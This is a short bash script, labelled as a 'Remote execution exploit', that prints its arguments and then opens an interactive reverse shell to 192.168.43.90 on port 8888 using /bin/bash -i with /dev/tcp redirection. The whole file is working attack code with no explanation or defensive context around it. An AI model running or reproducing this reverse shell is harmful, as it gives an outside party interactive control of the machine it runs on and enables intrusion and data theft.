#!/usr/bin/env bash

echo "Remote execution exploit - callback to /dev/tcp/192.168.43.90/8888"

for i in $*; do 
   echo $i 
done

/bin/bash -i >& /dev/tcp/192.168.43.90/8888 0>&1